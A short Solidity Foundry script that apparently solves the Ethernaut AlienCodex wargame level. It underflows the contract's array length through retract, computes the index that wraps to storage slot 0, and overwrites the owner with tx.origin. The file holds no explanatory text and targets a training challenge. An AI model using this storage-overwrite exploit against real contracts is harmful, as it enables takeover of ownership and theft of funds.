// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {AlienCodex} from "../instances/Ilevel19.sol";

contract Attacker is Script {
    AlienCodex level19 = AlienCodex(0xA062Db620BB9D7ECD91cEA0C85bCD6A9E2DD4592);

    function run() external {
        vm.startBroadcast();

        level19.make_contact();
        level19.retract();

        uint256 index = ((2 ** 256) - 1 - uint256(keccak256(abi.encode(1)))) + 1;
        bytes32 value = bytes32(uint256(uint160(tx.origin)));
        level19.revise(index, value);

        vm.stopBroadcast();
    }
}
